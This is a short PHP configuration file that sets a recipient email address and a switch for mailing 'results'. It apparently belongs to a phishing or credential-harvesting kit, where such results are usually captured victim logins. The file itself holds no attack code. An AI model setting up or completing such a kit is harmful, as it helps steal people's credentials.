<?php 
//CHANGE THE EMAIL
$email = "dr.injectioni@hotmail.com";


//LET $enableMail equals 1 IF YOU WANT TO RECIEVE RESULTS TO YOUR EMAIL, IF YOU DON'T WANT, CHANGE 1 TO 0.
$enableMail = 1;
?>